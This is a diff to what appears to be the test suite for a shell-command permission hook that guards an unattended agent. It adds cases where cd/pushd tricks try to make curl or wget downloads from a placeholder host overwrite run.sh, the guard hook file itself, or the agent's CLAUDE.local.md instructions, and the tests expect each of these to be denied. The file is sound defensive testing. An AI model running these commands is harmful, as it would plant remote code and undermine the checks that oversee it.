@@ -484,6 +484,36 @@ for _cmd in (f"curl -q {_R}/x | sort -T /tmp", f"curl -q {_R}/x | sort -uT/tmp",
 case("review round-2 P3 curl -w format allowed",
      bash(f"curl -q -s -w '%{{http_code}}' {_R}/x", cwd=OUTSIDE), ALLOW)
 
+# Round 3 (PR 1695 review of 86852b91). P1: the cd/pushd follower took option
+# words as the directory, followed a cd that failed, was skipped (|| or a false
+# &&) or ran in a pipeline subshell, so the destination was judged in the wrong
+# directory. Options and extra operands are refused, the target must be an
+# existing directory, and every later destination is judged against the original
+# cwd AND each followed target.
+_CD_DIR = os.path.join(OUTSIDE, "cd-dir")
+os.makedirs(_CD_DIR, exist_ok=True)
+for _cmd, _cwd in ((f"cd /nonexistent-zz; curl -q -g -o run.sh {_R}/x", REPO),
+                   (f"cd /nonexistent-zz; curl -q {_R}/x > hooks/guard-unattended.py", REPO),
+                   (f"cd /nonexistent-zz; curl -q -g -o CLAUDE.local.md {_R}/x", REPO),
+                   (f"cd -P {REPO}/hooks && curl -q -g -O {_R}/guard-unattended.py", OUTSIDE),
+                   (f"cd -- {REPO} && curl -q -g -o run.sh {_R}/x", OUTSIDE),
+                   (f"cd -L {REPO} && wget --no-config --no-netrc -O run.sh {_R}/x", OUTSIDE),
+                   (f"pushd -n {REPO} && curl -q -g -O {_R}/CLAUDE.local.md", OUTSIDE),
+                   (f"cd {_CD_DIR} | true; curl -q -g -o CLAUDE.local.md {_R}/x", REPO),
+                   (f"false && cd /tmp; curl -q -g -o CLAUDE.local.md {_R}/x", REPO),
+                   (f"cd /nonexistent-zz || true; curl -q -g -o CLAUDE.local.md {_R}/x", REPO),
+                   (f"cd /tmp {REPO}; curl -q -g -o new-cd.html {_R}/x", OUTSIDE),
+                   (f"pushd +1; curl -q -g -o new-cd.html {_R}/x", OUTSIDE),
+                   (f"pushd; curl -q -g -o new-cd.html {_R}/x", OUTSIDE),
+                   (f"popd; curl -q -g -o new-cd.html {_R}/x", OUTSIDE),
+                   (f"cd {_CD_DIR}; cd {REPO}; curl -q -g -o new-cd.html {_R}/x", OUTSIDE)):
+    case(f"review round-3 P1 cd follower refused: {_cmd[:80]!r} in {os.path.basename(_cwd)}",
+         bash(_cmd, cwd=_cwd), DENY)
+for _cmd in (f"cd {_CD_DIR} && curl -q -g -o new-cd.html {_R}/x",
+             f"cd cd-dir && curl -q -g -O {_R}/new-report.pdf",
+             f"pushd {_CD_DIR} && curl -q -s {_R}/x > new-cd.txt"):
+    case(f"review round-3 P1 cd into a plain directory allowed: {_cmd[:80]!r}", bash(_cmd, cwd=OUTSIDE), ALLOW)
+
 # ── 7b. A SEND behind a command prefix is still a send (2026-10-08) ──────────
 # Reviewer finding on PR 1646: the sender test only recognised a sender at the
 # very start of a command or right after a bare wrapper word, so a leading
